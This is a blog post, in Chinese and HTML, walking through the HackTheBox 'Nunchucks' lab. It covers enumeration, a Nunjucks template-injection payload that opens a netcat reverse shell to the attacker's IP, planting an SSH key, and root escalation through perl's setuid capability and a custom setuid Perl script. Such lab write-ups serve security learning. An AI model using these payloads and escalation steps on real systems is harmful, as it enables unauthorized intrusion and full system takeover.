<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HackTheBox Nunchucks Walkthrough | Kur0's Blog</title><meta name="keywords" content="writeups,hackthebox,Linux,NodeJS,SSTI,SUID"><meta name="author" content="Kur0"><meta name="copyright" content="Kur0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HackTheBox Nunchucks Walkthrough">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox Nunchucks Walkthrough">
<meta property="og:url" content="https://blog.dojokuro.top/2022/02/11/HackTheBox-Nunchucks-Walkthrough/index.html">
<meta property="og:site_name" content="Kur0&#39;s Blog">
<meta property="og:description" content="HackTheBox Nunchucks Walkthrough">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.dojokuro.top/2022/02/11/HackTheBox-Nunchucks-Walkthrough/cover.png">
<meta property="article:published_time" content="2022-02-11T01:47:03.000Z">
<meta property="article:modified_time" content="2023-06-05T08:05:27.596Z">
<meta property="article:author" content="Kur0">
<meta property="article:tag" content="writeups">
<meta property="article:tag" content="hackthebox">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="NodeJS">
<meta property="article:tag" content="SSTI">
<meta property="article:tag" content="SUID">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.dojokuro.top/2022/02/11/HackTheBox-Nunchucks-Walkthrough/cover.png"><link rel="shortcut icon" href="/uploads/image/favicon.png"><link rel="canonical" href="https://blog.dojokuro.top/2022/02/11/HackTheBox-Nunchucks-Walkthrough/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":200,"languages":{"author":"作者: Kur0","link":"链接: ","source":"来源: Kur0's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HackTheBox Nunchucks Walkthrough',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-06-05 16:05:27'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/uploads/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/2022/02/11/HackTheBox-Nunchucks-Walkthrough/cover.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Kur0's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HackTheBox Nunchucks Walkthrough</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-11T01:47:03.000Z" title="发表于 2022-02-11 09:47:03">2022-02-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-05T08:05:27.596Z" title="更新于 2023-06-05 16:05:27">2023-06-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/">writeups</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/hackthebox/">hackthebox</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.222 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span><br><span class="line"><span class="comment"># $ports=22,80</span></span><br><span class="line"></span><br><span class="line">nmap -sC -sV -p<span class="variable">$ports</span> 10.10.11.122</span><br><span class="line"><span class="comment"># Nmap 7.92 scan initiated Wed Feb  9 22:22:20 2022 as: nmap -sC -sV -p22,80,443 -v -oN nmaplog.txt 10.10.11.122</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.122</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)</span><br><span class="line">|   256 a2:f4:2c:42:74:65:a3:7c:26:<span class="built_in">dd</span>:49:72:23:82:72:71 (ECDSA)</span><br><span class="line">|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)</span><br><span class="line">80/tcp  open  http     nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to https://nunchucks.htb/</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 4BD6ED13BE03ECBBD7F9FA7BAA036F95</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Nunchucks - Landing Page</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK</span><br><span class="line">| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb</span><br><span class="line">| Issuer: commonName=Nunchucks-CA/countryName=US</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2021-08-30T15:42:24</span><br><span class="line">| Not valid after:  2031-08-28T15:42:24</span><br><span class="line">| MD5:   57fc 410d e809 1ce6 82f9 7bee 4f39 6fe4</span><br><span class="line">|_SHA-1: 518c 0fd1 6903 75c0 f26b a6cb e37d 53b8 a3ff 858b</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done 1 IP address (1 host up) scanned in 34.33 seconds</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-Application"><a href="#Web-Application" class="headerlink" title="Web Application"></a>Web Application</h2><p>修改hosts文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;10.10.11.122  nunchucks.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>访问网站，自动转为https协议，扫描目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&#x27;https://nunchucks.htb&#x27;</span>   </span><br><span class="line">[23:09:36] Starting:                       </span><br><span class="line">[23:09:42] 400 -  166B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            </span><br><span class="line">[23:10:37] 301 -  179B  - /assets  -&gt;  /assets/                            </span><br><span class="line">[23:10:44] 400 -  166B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd    </span><br><span class="line">[23:11:16] 200 -    9KB - /login           </span><br><span class="line">[23:11:17] 200 -    9KB - /login/          </span><br><span class="line">[23:11:37] 200 -   19KB - /privacy         </span><br><span class="line">[23:11:42] 400 -    1KB - /servlet/%C0%AE%C0%AE%C0%AF                      </span><br><span class="line">[23:11:45] 200 -    9KB - /signup          </span><br><span class="line">[23:11:53] 200 -   17KB - /terms           </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<p>发现注册和登录页面，访问注册页面进行注册</p>
<p><img src="signup.png" alt="signup"></p>
<p><img src="login.png" alt="login"></p>
<p>注册、登录均关闭，继续爆破子域名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 2271 -H <span class="string">&quot;Host: FUZZ.nunchucks.htb&quot;</span>  -u <span class="string">&quot;https://nunchucks.htb&quot;</span>            </span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: https://nunchucks.htb/</span><br><span class="line">Total requests: 4997</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload      </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000081:   200        101 L    259 W      4028 Ch     <span class="string">&quot;store&quot;</span> </span><br></pre></td></tr></table></figure>

<p>hosts文件加入store.nunchucks.htb后访问页面</p>
<p><img src="store.png" alt="store"></p>
<hr>
<h1 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>输入邮箱地址，通过burp抓包修改参数可以发现SSTI漏洞</p>
<p><img src="burp.png" alt="burp"></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks">NUNJUCKS(NodeJS) SSTI vulnerability</a></p>
</blockquote>
<p>模板注入反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload:&#123;&#123;range.constructor(\&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.4 4444 &gt;/tmp/f&#x27;)\&quot;)()&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.4] from (UNKNOWN) [10.10.11.122] 49368</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/var/www/store.nunchucks</span></span><br><span class="line"><span class="string">$ cd ~</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取sshshell</span></span><br><span class="line"><span class="string">$ mkdir .ssh</span></span><br><span class="line"><span class="string">$ cd .ssh</span></span><br><span class="line"><span class="string">$ echo id_rsa.pub &gt; authorized_keys</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ssh david@10.10.11.122                                                                          </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-86-generic x86_64)                                   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com                                                          </span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com                                                  </span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Fri 11 Feb 01:11:31 UTC 2022                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:             0.55                                                                     </span></span><br><span class="line"><span class="string">  Usage of /:              48.8% of 6.82GB                                                          </span></span><br><span class="line"><span class="string">  Memory usage:            45%                                                                      </span></span><br><span class="line"><span class="string">  Swap usage:              0%                                                                       </span></span><br><span class="line"><span class="string">  Processes:               270                                                                      </span></span><br><span class="line"><span class="string">  Users logged in:         0                                                                        </span></span><br><span class="line"><span class="string">  IPv4 address for ens160: 10.10.11.122                                                             </span></span><br><span class="line"><span class="string">  IPv6 address for ens160: dead:beef::250:56ff:feb9:19d7                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">10 updates can be applied immediately.                                                              </span></span><br><span class="line"><span class="string">To see these additional updates run: apt list --upgradable                                          </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.                                              </span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">david@nunchucks:/tmp$ id</span></span><br><span class="line"><span class="string">uid=1000(david) gid=1000(david) groups=1000(david)</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>查看可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@nunchucks:/tmp$ find / -<span class="built_in">type</span> f -perm -u=s 2&gt;/dev/null</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/sbin/pppd</span><br></pre></td></tr></table></figure>

<p>同时查看网站配置文件发现mysql用户名密码，经测试均无法提权</p>
<p>最后经网上搜索发现通过getcap查看文件capabilities</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@nunchucks:/tmp$ <span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/perl = cap_setuid+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br></pre></td></tr></table></figure>

<p>发现perl有cap_setuid+ep属性，可以通过perl提权<br>参考<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/perl/#capabilities">https://gtfobins.github.io/gtfobins/perl/#capabilities</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 尝试提权</span></span><br><span class="line">david@nunchucks:/tmp$ perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#x27;</span> </span><br><span class="line">david@nunchucks:/tmp$ <span class="built_in">id</span></span><br><span class="line">uid=1000(david) gid=1000(david) <span class="built_in">groups</span>=1000(david)</span><br><span class="line"><span class="comment"># 未成功 - -</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用其他命令</span></span><br><span class="line">david@nunchucks:/tmp$ perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;id&quot;;&#x27;</span> </span><br><span class="line">uid=0(root) gid=1000(david) <span class="built_in">groups</span>=1000(david)</span><br><span class="line">david@nunchucks:/tmp$ perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;cat /root/root.txt&quot;;&#x27;</span> </span><br><span class="line"><span class="built_in">cat</span>: /root/root.txt: Permission denied <span class="comment"># 无权限，什么鬼？</span></span><br></pre></td></tr></table></figure>

<p>继续搜索…发现使用了AppArmor技术</p>
<blockquote>
<p><strong>AppArmor</strong><br>Introduction<br>AppArmor is a Mandatory Access Control (MAC) system which is a kernel (LSM) enhancement to confine programs to a limited set of resources. AppArmor’s security model is to bind access control attributes to programs rather than to users. AppArmor confinement is provided via profiles loaded into the kernel, typically on boot. AppArmor profiles can be in one of two modes: enforcement and complain. Profiles loaded in enforcement mode will result in enforcement of the policy defined in the profile as well as reporting policy violation attempts (either via syslog or auditd). Profiles in complain mode will not enforce policy but instead report policy violation attempts.<br>AppArmor differs from some other MAC systems on Linux: it is path-based, it allows mixing of enforcement and complain mode profiles, it uses include files to ease development, and it has a far lower barrier to entry than other popular MAC systems.<br>AppArmor is an established technology first seen in Immunix and later integrated into Ubuntu, Novell/SUSE, and Mandriva. Core AppArmor functionality is in the mainline Linux kernel from 2.6.36 onwards; work is ongoing by AppArmor, Ubuntu and other developers to merge additional AppArmor functionality into the mainline kernel.</p>
</blockquote>
<p>查看/etc/apparmor.d/usr.bin.perl</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Last Modified: Tue Aug 31 18:25:30 2021</span></span><br><span class="line"><span class="comment">#include &lt;tunables/global&gt;</span></span><br><span class="line"></span><br><span class="line">/usr/bin/perl &#123;</span><br><span class="line">  <span class="comment">#include &lt;abstractions/base&gt;</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/nameservice&gt;</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/perl&gt;</span></span><br><span class="line"></span><br><span class="line">  capability setuid,</span><br><span class="line"></span><br><span class="line">  deny owner /etc/nsswitch.conf r,</span><br><span class="line">  deny /root/* rwx,</span><br><span class="line">  deny /etc/shadow rwx,</span><br><span class="line"></span><br><span class="line">  /usr/bin/id mrix,</span><br><span class="line">  /usr/bin/ls mrix,</span><br><span class="line">  /usr/bin/cat mrix,</span><br><span class="line">  /usr/bin/whoami mrix,</span><br><span class="line">  /opt/backup.pl mrix,</span><br><span class="line">  owner /home/ r,</span><br><span class="line">  owner /home/david/ r,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无/root的rwx权限，但是有个/opt/backup.pl脚本，查看脚本内容</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl                                                                                     </span></span><br><span class="line"><span class="keyword">use</span> strict;                                                                                         </span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(strftime)</span>;</span><br><span class="line"><span class="keyword">use</span> DBI;</span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(setuid)</span>; </span><br><span class="line">POSIX::setuid(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $tmpdir        = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $backup_main = <span class="string">&#x27;/var/www&#x27;</span>;</span><br><span class="line"><span class="keyword">my</span> $now = strftime(<span class="string">&quot;%Y-%m-%d-%s&quot;</span>, <span class="keyword">localtime</span>);</span><br><span class="line"><span class="keyword">my</span> $tmpbdir = <span class="string">&quot;$tmpdir/backup_$now&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">printlog</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[&quot;</span>, strftime(<span class="string">&quot;%D %T&quot;</span>, <span class="keyword">localtime</span>), <span class="string">&quot;] $_[0]\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">archive</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printlog <span class="string">&quot;Archiving...&quot;</span>;</span><br><span class="line">    <span class="keyword">system</span>(<span class="string">&quot;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&quot;</span>);</span><br><span class="line">    printlog <span class="string">&quot;Backup complete in $tmpbdir/backup_$now.tar&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($&gt; != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span> <span class="string">&quot;You must run this script as root.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printlog <span class="string">&quot;Backup starts.&quot;</span>;</span><br><span class="line"><span class="keyword">mkdir</span>($tmpbdir);</span><br><span class="line">&amp;archive;</span><br><span class="line">printlog <span class="string">&quot;Moving $tmpbdir/backup_$now to /opt/web_backups&quot;</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&quot;</span>);</span><br><span class="line">printlog <span class="string">&quot;Removing temporary directory&quot;</span>;</span><br><span class="line"><span class="keyword">rmdir</span>($tmpbdir);</span><br><span class="line">printlog <span class="string">&quot;Completed&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>脚本通过设置setuid以root用户运行，这样可以按照同样方法写提权脚本</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/tmp/exp.pl</span></span><br><span class="line"><span class="comment">#!/usr/bin/perl                                                                                     </span></span><br><span class="line"><span class="keyword">use</span> strict;                                                                                         </span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(strftime)</span>;</span><br><span class="line"><span class="keyword">use</span> DBI;</span><br><span class="line"><span class="keyword">use</span> POSIX <span class="string">qw(setuid)</span>; </span><br><span class="line">POSIX::setuid(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;/usr/bin/bash&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@nunchucks:/tmp$ <span class="built_in">chmod</span> +x exp.pl</span><br><span class="line">david@nunchucks:/tmp$ ./exp.pl</span><br><span class="line">root@nunchucks:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1000(david) <span class="built_in">groups</span>=1000(david)</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://fuckcloudnative.io/posts/linux-capabilities-in-practice-1/">Linux Capabilities 入门教程：基础实战篇</a><br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins">GTFOBins</a><br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/">HackTricks</a></p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Kur0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.dojokuro.top/2022/02/11/HackTheBox-Nunchucks-Walkthrough/">https://blog.dojokuro.top/2022/02/11/HackTheBox-Nunchucks-Walkthrough/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.dojokuro.top" target="_blank">Kur0's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/writeups/">writeups</a><a class="post-meta__tags" href="/tags/hackthebox/">hackthebox</a><a class="post-meta__tags" href="/tags/Linux/">Linux</a><a class="post-meta__tags" href="/tags/NodeJS/">NodeJS</a><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a><a class="post-meta__tags" href="/tags/SUID/">SUID</a></div><div class="post_share"><div class="social-share" data-image="/2022/02/11/HackTheBox-Nunchucks-Walkthrough/cover.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/01/30/BUUCTF-BUU-BRUTE-1-Writeup/"><img class="next-cover" src="/2022/01/30/BUUCTF-BUU-BRUTE-1-Writeup/cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div 